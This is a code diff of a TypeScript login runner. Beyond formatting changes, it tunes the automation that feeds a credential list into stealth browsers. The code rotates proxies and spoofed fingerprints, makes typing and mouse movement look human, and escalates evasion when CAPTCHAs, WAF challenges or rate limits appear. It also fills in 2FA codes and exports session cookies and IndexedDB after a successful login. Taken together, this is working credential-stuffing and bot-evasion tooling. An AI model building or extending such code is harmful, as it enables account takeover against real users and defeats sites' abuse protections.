@@ -20,7 +20,12 @@ import StealthPlugin from "puppeteer-extra-plugin-stealth";
 import type { Browser, BrowserContext, Page } from "playwright";
 import { applyAllEvasions, buildEvasionConfig } from "../evasions/index.js";
 import { HumanBehaviorMiddleware } from "../human/index.js";
-import type { Profile, Fingerprint, HumanBehavior, ProxyConfig } from "./types.js";
+import type {
+  Profile,
+  Fingerprint,
+  HumanBehavior,
+  ProxyConfig,
+} from "./types.js";
 import type {
   LoginRun,
   LoginRunConfig,
@@ -75,12 +80,16 @@ async function generateTotp(seed: string): Promise<string | null> {
     }
     const bytes = new Uint8Array(
       Array.from({ length: Math.floor(bits.length / 8) }, (_, i) =>
-        parseInt(bits.slice(i * 8, i * 8 + 8), 2)
-      )
+        parseInt(bits.slice(i * 8, i * 8 + 8), 2),
+      ),
     );
 
     const keyMaterial = await crypto.subtle.importKey(
-      "raw", bytes, { name: "HMAC", hash: "SHA-1" }, false, ["sign"]
+      "raw",
+      bytes,
+      { name: "HMAC", hash: "SHA-1" },
+      false,
+      ["sign"],
     );
 
     const T = Math.floor(Date.now() / 1000 / 30);
@@ -112,7 +121,7 @@ async function captureSessionState(
   page: Page,
   credentialId: string,
   profileId: string,
-  context: BrowserContext
+  context: BrowserContext,
 ): Promise<SessionState> {
   const url = page.url();
 
@@ -150,7 +159,11 @@ async function captureSessionState(
 
   // ── IndexedDB snapshot ────────────────────────────────────────────────────
   const idbSnapshot = await page.evaluate(async () => {
-    const result: { db_name: string; version: number; stores: { name: string; records: unknown[] }[] }[] = [];
+    const result: {
+      db_name: string;
+      version: number;
+      stores: { name: string; records: unknown[] }[];
+    }[] = [];
     try {
       const dbs = await indexedDB.databases?.();
       if (!dbs) return result;
@@ -172,7 +185,10 @@ async function captureSessionState(
               resolve();
               return;
             }
-            const tx = db.transaction(Array.from(db.objectStoreNames), "readonly");
+            const tx = db.transaction(
+              Array.from(db.objectStoreNames),
+              "readonly",
+            );
             for (const storeName of Array.from(db.objectStoreNames)) {
               const store = tx.objectStore(storeName);
               const records: unknown[] = [];
@@ -229,7 +245,7 @@ async function captureSessionState(
 async function restoreSessionState(
   page: Page,
   context: BrowserContext,
-  state: SessionState
+  state: SessionState,
 ): Promise<void> {
   // Restore cookies
   if (state.cookies.length > 0) {
@@ -243,7 +259,7 @@ async function restoreSessionState(
         httpOnly: c.httpOnly,
         secure: c.secure,
         sameSite: c.sameSite || "None",
-      }))
+      })),
     );
   }
 
@@ -263,15 +279,20 @@ async function restoreSessionState(
 // Soft signal detector
 // ─────────────────────────────────────────────────────────────────────────────
 
-async function detectSoftSignals(page: Page, config: LoginRunConfig): Promise<RotationTrigger[]> {
+async function detectSoftSignals(
+  page: Page,
+  config: LoginRunConfig,
+): Promise<RotationTrigger[]> {
   const signals: RotationTrigger[] = [];
 
   try {
     const url = page.url();
     const content = await page.content().catch(() => "");
-    const status = await page.evaluate(() => {
-      return window.__manifold_last_status ?? 0;
-    }).catch(() => 0);
+    const status = await page
+      .evaluate(() => {
+        return window.__manifold_last_status ?? 0;
+      })
+      .catch(() => 0);
 
     // HTTP 429 rate limit
     if (status === 429) {
@@ -280,7 +301,9 @@ async function detectSoftSignals(page: Page, config: LoginRunConfig): Promise<Ro
 
     // CAPTCHA widget presence
     if (config.form.captcha_selector) {
-      const captchaEl = await page.$(config.form.captcha_selector).catch(() => null);
+      const captchaEl = await page
+        .$(config.form.captcha_selector)
+        .catch(() => null);
       if (captchaEl) signals.push("captcha_detected");
     }
 
@@ -392,15 +415,22 @@ function applyDomainNoise(
 
   const newFp: Fingerprint = {
     ...fp,
-    canvas_noise: clampNoise(Math.max(fp.canvas_noise, domainProfile.canvas_noise) * aggressionFactor),
-    webgl_noise:  clampNoise(Math.max(fp.webgl_noise,  domainProfile.webgl_noise)  * aggressionFactor),
-    audio_noise:  clampNoise(Math.max(fp.audio_noise,  domainProfile.audio_noise)  * aggressionFactor),
+    canvas_noise: clampNoise(
+      Math.max(fp.canvas_noise, domainProfile.canvas_noise) * aggressionFactor,
+    ),
+    webgl_noise: clampNoise(
+      Math.max(fp.webgl_noise, domainProfile.webgl_noise) * aggressionFactor,
+    ),
+    audio_noise: clampNoise(
+      Math.max(fp.audio_noise, domainProfile.audio_noise) * aggressionFactor,
+    ),
     // Font subset — escalate only (full → reduced → paranoid)
     font_subset:
-      domainProfile.font_subset === "paranoid" ? []
-      : domainProfile.font_subset === "reduced" && fp.font_subset.length > 20
-        ? fp.font_subset.slice(0, 20)
-        : fp.font_subset,
+      domainProfile.font_subset === "paranoid"
+        ? []
+        : domainProfile.font_subset === "reduced" && fp.font_subset.length > 20
+          ? fp.font_subset.slice(0, 20)
+          : fp.font_subset,
     // Hardware spoofing
     hardware_concurrency: domainProfile.spoof_hw_concurrency
       ? Math.min(fp.hardware_concurrency, 8)
@@ -419,7 +449,9 @@ function applyDomainNoise(
     mouse: {
       ...humanCfg.mouse,
       base_speed_px_per_sec:
-        humanCfg.mouse.base_speed_px_per_sec * domainProfile.mouse_speed_factor * behaviorSlowdown,
+        humanCfg.mouse.base_speed_px_per_sec *
+        domainProfile.mouse_speed_factor *
+        behaviorSlowdown,
       curve_scatter: Math.min(
         2.0,
         humanCfg.mouse.curve_scatter * (1.0 + (aggressionFactor - 1.0) * 0.4),
@@ -427,9 +459,15 @@ function applyDomainNoise(
     },
     typing: {
       ...humanCfg.typing,
-      base_wpm: humanCfg.typing.base_wpm * domainProfile.typing_speed_factor * behaviorSlowdown,
+      base_wpm:
+        humanCfg.typing.base_wpm *
+        domainProfile.typing_speed_factor *
+        behaviorSlowdown,
       // Scale up typo rate slightly with aggression (more "nervous" typing)
-      typo_rate: Math.min(0.12, humanCfg.typing.typo_rate * (1.0 + (aggressionFactor - 1.0) * 0.2)),
+      typo_rate: Math.min(
+        0.12,
+        humanCfg.typing.typo_rate * (1.0 + (aggressionFactor - 1.0) * 0.2),
+      ),
     },
   };
 
@@ -444,7 +482,7 @@ async function launchBrowser(
   profile: Profile,
   proxy: ProxyConfig | null,
   domainProfile: DomainProfile,
-  patchTls: boolean
+  patchTls: boolean,
 ): Promise<{ browser: Browser; context: BrowserContext; page: Page }> {
   chromium.use(StealthPlugin());
 
@@ -472,7 +510,7 @@ async function launchBrowser(
     `--window-size=${fp.screen_width},${fp.screen_height}`,
   ];
 
-  const tlsArgs = (patchTls && domainProfile.patch_tls) ? TLS_PATCH_ARGS : [];
+  const tlsArgs = patchTls && domainProfile.patch_tls ? TLS_PATCH_ARGS : [];
 
   const browser = await chromium.launch({
     headless: false,
@@ -481,20 +519,20 @@ async function launchBrowser(
   });
 
   const contextOptions: Parameters<Browser["newContext"]>[0] = {
-    viewport:          { width: fp.viewport_width, height: fp.viewport_height },
+    viewport: { width: fp.viewport_width, height: fp.viewport_height },
     deviceScaleFactor: fp.pixel_ratio,
-    userAgent:         fp.user_agent,
-    locale:            fp.locale.replace("_", "-"),
-    timezoneId:        fp.timezone,
-    colorScheme:       "dark",
-    acceptDownloads:   false,
+    userAgent: fp.user_agent,
+    locale: fp.locale.replace("_", "-"),
+    timezoneId: fp.timezone,
+    colorScheme: "dark",
+    acceptDownloads: false,
     ignoreHTTPSErrors: false,
-    extraHTTPHeaders:  { "Accept-Language": fp.accept_language },
+    extraHTTPHeaders: { "Accept-Language": fp.accept_language },
   };
 
   if (proxy) {
     contextOptions.proxy = {
-      server:   proxy.server,
+      server: proxy.server,
       username: proxy.username,
       password: proxy.password,
     };
@@ -505,7 +543,7 @@ async function launchBrowser(
   // Block known tracking / analytics that inflate bot scores
   await context.route(
     /google-analytics\.com|doubleclick\.net|googlesyndication\.com|scorecardresearch\.com|quantserve\.com/,
-    (route) => route.abort()
+    (route) => route.abort(),
   );
 
   const page = await context.newPage();
@@ -513,9 +551,11 @@ async function launchBrowser(
   // Intercept responses to capture status codes for signal detection
   page.on("response", (res) => {
     if (res.status() === 429) {
-      page.evaluate((s: number) => {
-        window.__manifold_last_status = s;
-      }, 429).catch(() => {});
+      page
+        .evaluate((s: number) => {
+          window.__manifold_last_status = s;
+        }, 429)
+        .catch(() => {});
     }
   });
 
@@ -570,8 +610,14 @@ async function performLoginAttempt(
 
   // Pre-load signal check
   signals = await detectSoftSignals(page, config);
-  if (signals.includes("waf_challenge") || signals.includes("ip_block_signal")) {
-    const ss = await page.screenshot().catch(() => undefined).then(b => b?.toString("base64"));
+  if (
+    signals.includes("waf_challenge") ||
+    signals.includes("ip_block_signal")
+  ) {
+    const ss = await page
+      .screenshot()
+      .catch(() => undefined)
+      .then((b) => b?.toString("base64"));
     return {
       outcome: "ip_blocked",
       detail: `Detected WAF/IP block before login: ${signals.join(", ")}`,
@@ -584,11 +630,11 @@ async function performLoginAttempt(
 
   // ── 2. Human-like page appreciation pause ───────────────────────────────
   const loadPause = seededJitter(
-    domainProfile.min_attempt_gap_ms * 0.4,
+    domainProfile.min_attempt_gap_ms * 0.6,
     0.3,
-    credSeed
+    credSeed,
   );
-  await sleep(Math.max(800, loadPause));
+  await sleep(Math.max(1500, loadPause));
 
   // ── 3. Dismiss consent banner if present ────────────────────────────────
   if (form.consent_selector) {
@@ -596,7 +642,7 @@ async function performLoginAttempt(
     if (consent) {
       try {
         await human.click(form.consent_selector);
-        await sleep(seededJitter(600, 0.3, credSeed + 1));
+        await sleep(seededJitter(1200, 0.3, credSeed + 1));
       } catch {
         // Non-fatal
       }
@@ -605,60 +651,108 @@ async function performLoginAttempt(
 
   // ── 4. Type username ─────────────────────────────────────────────────────
   try {
+    // Wait for username field to be visible and enabled
+    await page.waitForSelector(form.username_selector, {
+      state: "visible",
+      timeout: 15_000,
+    });
+    // Click to focus the field first
+    await human.click(form.username_selector);
+    await sleep(seededJitter(400, 0.3, credSeed + 100));
+    // Clear any existing content
+    await page.fill(form.username_selector, "");
+    await sleep(seededJitter(300, 0.3, credSeed + 101));
+    // Type the username with human-like behavior
     await human.type(form.username_selector, credential.username);
   } catch (e) {
     return {
       outcome: "error",
-      detail: `Username field not found (${form.username_selector}): ${String(e).slice(0, 200)}`,
+      detail: `Username field not found or not interactable (${form.username_selector}): ${String(e).slice(0, 200)}`,
       finalUrl: page.url(),
       signals,
       sessionState: undefined,
-      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
+      screenshot: await page
+        .screenshot()
+        .catch(() => undefined)
+        .then((b) => b?.toString("base64")),
     };
   }
 
   // Pause between username and password (domain-tuned)
   const interFieldPause = seededJitter(
-    800 * (1 / domainProfile.typing_speed_factor),
+    1200 * (1 / domainProfile.typing_speed_factor),
     0.35,
-    credSeed + 2
+    credSeed + 2,
   );
   await sleep(interFieldPause);
 
   // ── 5. Type password ─────────────────────────────────────────────────────
   try {
+    // Wait for password field to be visible and enabled
+    await page.waitForSelector(form.password_selector, {
+      state: "visible",
+      timeout: 15_000,
+    });
+    // Click to focus the field first
+    await human.click(form.password_selector);
+    await sleep(seededJitter(400, 0.3, credSeed + 102));
+    // Clear any existing content
+    await page.fill(form.password_selector, "");
+    await sleep(seededJitter(300, 0.3, credSeed + 103));
+    // Type the password with human-like behavior
     await human.type(form.password_selector, credential.password);
   } catch (e) {
     return {
       outcome: "error",
-      detail: `Password field not found (${form.password_selector}): ${String(e).slice(0, 200)}`,
+      detail: `Password field not found or not interactable (${form.password_selector}): ${String(e).slice(0, 200)}`,
       finalUrl: page.url(),
       signals,
       sessionState: undefined,
-      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
+      screenshot: await page
+        .screenshot()
+        .catch(() => undefined)
+        .then((b) => b?.toString("base64")),
     };
   }
 
   // Pre-submit pause
   const preSubmitPause = seededJitter(
-    600 * (1 / domainProfile.typing_speed_factor),
+    1000 * (1 / domainProfile.typing_speed_factor),
     0.4,
-    credSeed + 3
+    credSeed + 3,
   );
   await sleep(preSubmitPause);
 
   // ── 6. Submit ─────────────────────────────────────────────────────────────
   try {
+    // Wait for submit button to be visible
+    await page.waitForSelector(form.submit_selector, {
+      state: "visible",
+      timeout: 10_000,
+    });
+    // Small pause before clicking submit (human-like hesitation)
+    await sleep(seededJitter(500, 0.3, credSeed + 104));
     await human.click(form.submit_selector);
+    // Wait for click to register before checking outcomes
+    await sleep(seededJitter(800, 0.3, credSeed + 105));
   } catch (e) {
-    return {
-      outcome: "error",
-      detail: `Submit button not found (${form.submit_selector}): ${String(e).slice(0, 200)}`,
-      finalUrl: page.url(),
-      signals,
-      sessionState: undefined,
-      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
-    };
+    // If submit button click fails, try pressing Enter as fallback
+    try {
+      await page.keyboard.press("Enter");
+      await sleep(seededJitter(800, 0.3, credSeed + 106));
+    } catch {
+      return {
+        outcome: "error",
+        detail: `Submit button not found and Enter key failed (${form.submit_selector}): ${String(e).slice(0, 200)}`,
+        finalUrl: page.url(),
+        signals,
+        sessionState: undefined,
+        screenshot: await page
+          .screenshot()
+          .catch(() => undefined)
+          .then((b) => b?.toString("base64")),
+      };
+    }
   }
 
   // ── 7. Wait for post-submit outcome ──────────────────────────────────────
@@ -673,43 +767,75 @@ async function performLoginAttempt(
     // Success selector
     if (form.success_selector) {
       conditions.push(
-        page.waitForSelector(form.success_selector, { timeout: postSubmitTimeout })
-          .then(() => ({ type: "success", detail: "Success selector found" }))
+        page
+          .waitForSelector(form.success_selector, {
+            timeout: postSubmitTimeout,
+          })
+          .then(() => ({ type: "success", detail: "Success selector found" })),
       );
     }
 
     // Failure selector
     if (form.failure_selector) {
       conditions.push(
-        page.waitForSelector(form.failure_selector, { timeout: postSubmitTimeout })
-          .then(() => ({ type: "wrong_credentials", detail: "Failure selector found" }))
+        page
+          .waitForSelector(form.failure_selector, {
+            timeout: postSubmitTimeout,
+          })
+          .then(() => ({
+            type: "wrong_credentials",
+            detail: "Failure selector found",
+          })),
       );
     }
 
     // CAPTCHA selector
     if (form.captcha_selector) {
       conditions.push(
-        page.waitForSelector(form.captcha_selector, { timeout: postSubmitTimeout })
-          .then(() => ({ type: "captcha_block", detail: "CAPTCHA appeared post-submit" }))
+        page
+          .waitForSelector(form.captcha_selector, {
+            timeout: postSubmitTimeout,
+          })
+          .then(() => ({
+            type: "captcha_block",
+            detail: "CAPTCHA appeared post-submit",
+          })),
       );
     }
 
     // TOTP selector (2FA)
     if (form.totp_selector) {
       conditions.push(
-        page.waitForSelector(form.totp_selector, { timeout: postSubmitTimeout })
-          .then(() => ({ type: "2fa_detected", detail: "2FA input appeared" }))
+        page
+          .waitForSelector(form.totp_selector, { timeout: postSubmitTimeout })
+          .then(() => ({ type: "2fa_detected", detail: "2FA input appeared" })),
       );
     }
 
-    // Fallback: navigation or URL change
+    // Fallback: navigation or URL change (try networkidle for full page load)
     conditions.push(
-      page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: postSubmitTimeout })
-        .then(() => ({ type: "navigation", detail: `Navigated to ${page.url()}` }))
+      page
+        .waitForNavigation({
+          waitUntil: "networkidle",
+          timeout: postSubmitTimeout,
+        })
+        .catch(() =>
+          page.waitForNavigation({
+            waitUntil: "domcontentloaded",
+            timeout: postSubmitTimeout / 2,
+          }),
+        )
+        .then(() => ({
+          type: "navigation",
+          detail: `Navigated to ${page.url()}`,
+        })),
     );
 
     if (conditions.length === 0) {
+      // No selectors provided - wait for page to stabilize
       await sleep(postSubmitTimeout);
+      // Additional wait for any dynamic content
+      await sleep(3000);
     } else {
       const result = await Promise.race(conditions).catch((e) => ({
         type: "timeout",
@@ -720,13 +846,13 @@ async function performLoginAttempt(
       if (result.type === "2fa_detected" && form.totp_selector) {
         const totpCode = credential.extras.totp_seed
           ? await generateTotp(credential.extras.totp_seed)
-          : credential.extras.totp_code ?? null;
+          : (credential.extras.totp_code ?? null);
 
         if (totpCode) {
-          await sleep(seededJitter(1200, 0.3, credSeed + 10));
+          await sleep(seededJitter(2000, 0.3, credSeed + 10));
           try {
             await human.type(form.totp_selector, totpCode);
-            await sleep(seededJitter(500, 0.3, credSeed + 11));
+            await sleep(seededJitter(1000, 0.3, credSeed + 11));
 
             // Re-look for submit or press Enter
             const totpSubmit = form.submit_selector;
@@ -738,15 +864,28 @@ async function performLoginAttempt(
 
             // Wait again for success/failure
             if (form.success_selector) {
-              await page.waitForSelector(form.success_selector, {
-                timeout: postSubmitTimeout,
-              }).catch(() => {});
+              await page
+                .waitForSelector(form.success_selector, {
+                  timeout: postSubmitTimeout,
+                })
+                .catch(() => {});
             } else {
-              await page.waitForNavigation({
-                waitUntil: "domcontentloaded",
-                timeout: postSubmitTimeout,
-              }).catch(() => {});
+              await page
+                .waitForNavigation({
+                  waitUntil: "networkidle",
+                  timeout: postSubmitTimeout,
+                })
+                .catch(() =>
+                  page
+                    .waitForNavigation({
+                      waitUntil: "domcontentloaded",
+                      timeout: postSubmitTimeout / 2,
+                    })
+                    .catch(() => {}),
+                );
             }
+            // Extra stabilization wait after 2FA
+            await sleep(3000);
 
             outcome = "success";
             detail = "2FA completed successfully";
@@ -756,7 +895,8 @@ async function performLoginAttempt(
           }
         } else {
           outcome = "2fa_required";
-          detail = "2FA required but no TOTP seed or code provided in credential extras";
+          detail =
+            "2FA required but no TOTP seed or code provided in credential extras";
         }
       } else {
         // Map detected type to outcome
@@ -774,6 +914,9 @@ async function performLoginAttempt(
             detail = result.detail;
             break;
           case "navigation": {
+            // Wait for page to fully stabilize after navigation
+            await sleep(2000);
+
             // Determine success/failure from resulting URL + page content
             const finalUrl = page.url();
             const pageSignals = await detectSoftSignals(page, config);
@@ -798,10 +941,7 @@ async function performLoginAttempt(
                 const finalHost = new URL(finalUrl).hostname;
                 const loginPath = new URL(form.url).pathname;
                 const finalPath = new URL(finalUrl).pathname;
-                if (
-                  finalHost === loginHost &&
-                  finalPath === loginPath
-                ) {
+                if (finalHost === loginHost && finalPath === loginPath) {
                   // Still on login page — likely failed
                   outcome = "wrong_credentials";
                   detail = "Still on login page after submit";
@@ -818,8 +958,26 @@ async function performLoginAttempt(
           }
           case "timeout":
           default:
-            outcome = "timeout";
-            detail = result.detail || "Post-submit timeout";
+            // On timeout, still wait a bit and check if we actually succeeded
+            await sleep(3000);
+            const timeoutUrl = page.url();
+            try {
+              const loginHost = new URL(form.url).hostname;
+              const timeoutHost = new URL(timeoutUrl).hostname;
+              const loginPath = new URL(form.url).pathname;
+              const timeoutPath = new URL(timeoutUrl).pathname;
+              if (timeoutHost !== loginHost || timeoutPath !== loginPath) {
+                // We navigated away - might actually be success
+                outcome = "success";
+                detail = `Navigation detected after timeout: ${timeoutUrl}`;
+              } else {
+                outcome = "timeout";
+                detail = result.detail || "Post-submit timeout";
+              }
+            } catch {
+              outcome = "timeout";
+              detail = result.detail || "Post-submit timeout";
+            }
         }
       }
     }
@@ -829,6 +987,8 @@ async function performLoginAttempt(
   }
 
   // ── 8. Post-outcome signal sweep ─────────────────────────────────────────
+  // Wait for any final page updates before checking signals
+  await sleep(1500);
   const postSignals = await detectSoftSignals(page, config);
   for (const s of postSignals) {
     if (!signals.includes(s)) signals.push(s);
@@ -843,13 +1003,21 @@ async function performLoginAttempt(
   const finalUrl = page.url();
 
   // ── 9. Screenshot at resolution ──────────────────────────────────────────
-  const screenshot = await page.screenshot().catch(() => undefined).then(b => b?.toString("base64"));
+  const screenshot = await page
+    .screenshot()
+    .catch(() => undefined)
+    .then((b) => b?.toString("base64"));
 
   // ── 10. Session export on success ────────────────────────────────────────
   let sessionState: SessionState | undefined;
   if (outcome === "success" && config.form.export_session_on_success) {
     try {
-      sessionState = await captureSessionState(page, credential.id, "", context);
+      sessionState = await captureSessionState(
+        page,
+        credential.id,
+        "",
+        context,
+      );
     } catch {
       // Non-fatal
     }
@@ -887,7 +1055,9 @@ function enforceGeoConsistency(
   // Deterministic sub-RNG seeded from profile seed XOR a geo salt
   let s = (seed ^ 0x9e0c0de) >>> 0;
   const rng = () => {
-    s ^= s << 13; s ^= s >>> 17; s ^= s << 5;
+    s ^= s << 13;
+    s ^= s >>> 17;
+    s ^= s << 5;
     return (s >>> 0) / 0x100000000;
   };
 
@@ -936,17 +1106,35 @@ function enforceGeoConsistency(
   const options = GEO[cc];
   if (!options) return fp; // unknown country — leave untouched
 
-  const [locale, acceptLanguage, timezone] = options[Math.floor(rng() * options.length)];
+  const [locale, acceptLanguage, timezone] =
+    options[Math.floor(rng() * options.length)];
 
   // 4K screen geo-gate: only realistic in high-income / tech markets
-  const allow4K = ["US","JP","KR","DE","GB","AU","CA","SE","NO","CH"].includes(cc);
-  let { screen_width, screen_height, viewport_width, viewport_height, pixel_ratio } = fp;
+  const allow4K = [
+    "US",
+    "JP",
+    "KR",
+    "DE",
+    "GB",
+    "AU",
+    "CA",
+    "SE",
+    "NO",
+    "CH",
+  ].includes(cc);
+  let {
+    screen_width,
+    screen_height,
+    viewport_width,
+    viewport_height,
+    pixel_ratio,
+  } = fp;
   if (!allow4K && screen_width >= 3840) {
-    screen_width   = 1920;
-    screen_height  = 1080;
+    screen_width = 1920;
+    screen_height = 1080;
     viewport_width = 1920;
     viewport_height = Math.max(600, 1080 - 88 - 40 - Math.floor(rng() * 20));
-    pixel_ratio     = rng() < 0.3 ? 1.25 : 1.0;
+    pixel_ratio = rng() < 0.3 ? 1.25 : 1.0;
   }
 
   return {
@@ -977,13 +1165,19 @@ export class LoginRunner {
   private _aggressionFactor = 1.0;
   private _cleanStreak = 0;
   private readonly _AGGRESSION_ESCALATE = 1.4;
-  private readonly _AGGRESSION_DECAY    = 0.85;
-  private readonly _AGGRESSION_MAX      = 4.0;
-  private readonly _CLEAN_STREAK_DECAY  = 3;   // clean attempts before decay tick
+  private readonly _AGGRESSION_DECAY = 0.85;
+  private readonly _AGGRESSION_MAX = 4.0;
+  private readonly _CLEAN_STREAK_DECAY = 3; // clean attempts before decay tick
 
   constructor(
     private readonly profiles: Profile[],
-    private readonly proxies: Array<{ id: string; server: string; username?: string; password?: string; healthy: boolean }>,
+    private readonly proxies: Array<{
+      id: string;
+      server: string;
+      username?: string;
+      password?: string;
+      healthy: boolean;
+    }>,
     private readonly broadcast: BroadcastFn,
   ) {}
 
@@ -1016,7 +1210,11 @@ export class LoginRunner {
         await this._runSequential(run, domainProfile);
       }
     } catch (e) {
-      this.broadcast({ type: "login_error", run_id: run.id, message: String(e) });
+      this.broadcast({
+        type: "login_error",
+        run_id: run.id,
+        message: String(e),
+      });
     }
 
     run.finished_at = now();
@@ -1026,7 +1224,11 @@ export class LoginRunner {
     if (this._aborted) {
       this.broadcast({ type: "login_run_aborted", run_id: run.id });
     } else {
-      this.broadcast({ type: "login_run_complete", run_id: run.id, stats: run.stats });
+      this.broadcast({
+        type: "login_run_complete",
+        run_id: run.id,
+        stats: run.stats,
+      });
     }
   }
 
@@ -1050,9 +1252,15 @@ export class LoginRunner {
 
   // ── Sequential runner ─────────────────────────────────────────────────────
 
-  private async _runSequential(run: LoginRun, domainProfile?: DomainProfile): Promise<void> {
-    const pending = run.credentials.filter(c =>
-      c.status === "pending" || c.status === "error" || c.status === "soft_blocked"
+  private async _runSequential(
+    run: LoginRun,
+    domainProfile?: DomainProfile,
+  ): Promise<void> {
+    const pending = run.credentials.filter(
+      (c) =>
+        c.status === "pending" ||
+        c.status === "error" ||
+        c.status === "soft_blocked",
     );
 
     for (const credential of pending) {
@@ -1067,18 +1275,29 @@ export class LoginRunner {
       await this._attemptCredential(run, credential, domainProfile);
 
       // Domain-aware inter-attempt gap
-      const gap = domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
-      const jittered = seededJitter(gap, 0.25, credential.username.length + Date.now() % 1000);
+      const gap =
+        domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
+      const jittered = seededJitter(
+        gap,
+        0.25,
+        credential.username.length + (Date.now() % 1000),
+      );
       await sleep(jittered);
     }
   }
 
   // ── Parallel runner ───────────────────────────────────────────────────────
 
-  private async _runParallel(run: LoginRun, domainProfile?: DomainProfile): Promise<void> {
+  private async _runParallel(
+    run: LoginRun,
+    domainProfile?: DomainProfile,
+  ): Promise<void> {
     const concurrency = Math.max(1, Math.min(run.config.concurrency, 8));
-    const pending = run.credentials.filter(c =>
-      c.status === "pending" || c.status === "error" || c.status === "soft_blocked"
+    const pending = run.credentials.filter(
+      (c) =>
+        c.status === "pending" ||
+        c.status === "error" ||
+        c.status === "soft_blocked",
     );
 
     // Chunked parallel execution
@@ -1095,10 +1314,11 @@ export class LoginRunner {
           if (!this._aborted) {
             await this._attemptCredential(run, cred, domainProfile);
           }
-        })
+        }),
       );
 
-      const gap = domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
+      const gap =
+        domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
       await sleep(gap * 0.5);
     }
   }
@@ -1115,11 +1335,15 @@ export class LoginRunner {
    */
   private _updateAggression(run: LoginRun, signals: string[]): void {
     const WAF_SIGNALS = new Set([
-      "captcha_detected", "waf_challenge", "rate_limit_429",
-      "rate_limit_response", "ip_block_signal", "redirect_to_verify",
+      "captcha_detected",
+      "waf_challenge",
+      "rate_limit_429",
+      "rate_limit_response",
+      "ip_block_signal",
+      "redirect_to_verify",
     ]);
 
-    const hadWafSignal = signals.some(s => WAF_SIGNALS.has(s));
+    const hadWafSignal = signals.some((s) => WAF_SIGNALS.has(s));
     const prevFactor = this._aggressionFactor;
 
     if (hadWafSignal) {
@@ -1172,8 +1396,19 @@ export class LoginRunner {
     let profile = this._pickProfile(config.profile_pool, credential);
     if (!profile) {
       credential.status = "error";
-      this._recordResult(run, credential, null, null, "error",
-        "No available profile in pool", "", [], [], undefined, undefined);
+      this._recordResult(
+        run,
+        credential,
+        null,
+        null,
+        "error",
+        "No available profile in pool",
+        "",
+        [],
+        [],
+        undefined,
+        undefined,
+      );
       return;
     }
 
@@ -1205,7 +1440,7 @@ export class LoginRunner {
     // locale / timezone / screen resolution to match.  This prevents the most
     // common 2026 consistency-violation signal: proxy in US, timezone=Asia/Tokyo.
     if (proxy) {
-      const proxyRecord = this.proxies.find(p => p.server === proxy.server);
+      const proxyRecord = this.proxies.find((p) => p.server === proxy.server);
       const country = (proxyRecord as any)?.country as string | undefined;
       if (country) {
         adjustedProfile.fingerprint = enforceGeoConsistency(
@@ -1236,15 +1471,32 @@ export class LoginRunner {
     let browser: Browser | undefined;
 
     try {
-      const launched = await launchBrowser(adjustedProfile, proxy, dp, config.patch_tls);
+      const launched = await launchBrowser(
+        adjustedProfile,
+        proxy,
+        dp,
+        config.patch_tls,
+      );
       browser = launched.browser;
       const { context, page } = launched;
 
-      const human = new HumanBehaviorMiddleware(page, adjustedHuman, adjustedFp.seed);
-      const credSeed = credential.username.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
+      const human = new HumanBehaviorMiddleware(
+        page,
+        adjustedHuman,
+        adjustedFp.seed,
+      );
+      const credSeed = credential.username
+        .split("")
+        .reduce((a, c) => a + c.charCodeAt(0), 0);
 
       const result = await performLoginAttempt(
-        page, context, human, credential, config, dp, credSeed
+        page,
+        context,
+        human,
+        credential,
+        config,
+        dp,
+        credSeed,
       );
 
       // ── Adaptive aggression update ────────────────────────────────────────
@@ -1259,7 +1511,12 @@ export class LoginRunner {
 
         // Check if rotation threshold exceeded
         if (count >= config.soft_signal_threshold) {
-          const rotated = await this._rotate(run, credential, profile, sig as RotationTrigger);
+          const rotated = await this._rotate(
+            run,
+            credential,
+            profile,
+            sig as RotationTrigger,
+          );
           if (rotated) {
             profile = rotated;
             const evt: RotationEvent = {
@@ -1274,17 +1531,29 @@ export class LoginRunner {
             };
             rotationEvents.push(evt);
             run.rotation_log.push(evt);
-            this.broadcast({ type: "login_rotation", run_id: run.id, event: evt });
+            this.broadcast({
+              type: "login_rotation",
+              run_id: run.id,
+              event: evt,
+            });
             this._softSignalCounts.delete(sig);
           }
         }
       }
 
       // Track consecutive failures for rotation
-      if (result.outcome === "wrong_credentials" || result.outcome === "timeout") {
+      if (
+        result.outcome === "wrong_credentials" ||
+        result.outcome === "timeout"
+      ) {
         this._consecutiveFailures++;
         if (this._consecutiveFailures >= 3) {
-          const rotated = await this._rotate(run, credential, profile, "consecutive_failures");
+          const rotated = await this._rotate(
+            run,
+            credential,
+            profile,
+            "consecutive_failures",
+          );
           if (rotated) {
             const evt: RotationEvent = {
               ts: Date.now(),
@@ -1298,7 +1567,11 @@ export class LoginRunner {
             };
             rotationEvents.push(evt);
             run.rotation_log.push(evt);
-            this.broadcast({ type: "login_rotation", run_id: run.id, event: evt });
+            this.broadcast({
+              type: "login_rotation",
+              run_id: run.id,
+              event: evt,
+            });
           }
           this._consecutiveFailures = 0;
         }
@@ -1316,20 +1589,37 @@ export class LoginRunner {
       }
 
       this._recordResult(
-        run, credential, profile, proxy,
-        result.outcome, result.detail,
-        result.finalUrl, result.signals,
+        run,
+        credential,
+        profile,
+        proxy,
+        result.outcome,
+        result.detail,
+        result.finalUrl,
+        result.signals,
         rotationEvents,
         result.sessionState,
         result.screenshot,
-        startedAt, startMs,
+        startedAt,
+        startMs,
       );
-
     } catch (e) {
       credential.status = "error";
-      this._recordResult(run, credential, profile, proxy, "error",
+      this._recordResult(
+        run,
+        credential,
+        profile,
+        proxy,
+        "error",
         `Runner error: ${String(e).slice(0, 300)}`,
-        "", [], rotationEvents, undefined, undefined, startedAt, startMs);
+        "",
+        [],
+        rotationEvents,
+        undefined,
+        undefined,
+        startedAt,
+        startMs,
+      );
     } finally {
       if (browser) {
         await browser.close().catch(() => {});
@@ -1349,10 +1639,11 @@ export class LoginRunner {
   ): Promise<Profile | null> {
     // Find the next idle profile in the pool (skip current)
     const pool = run.config.profile_pool;
-    const available = this.profiles.filter(p =>
-      pool.includes(p.id) &&
-      p.id !== currentProfile.id &&
-      p.status === "idle"
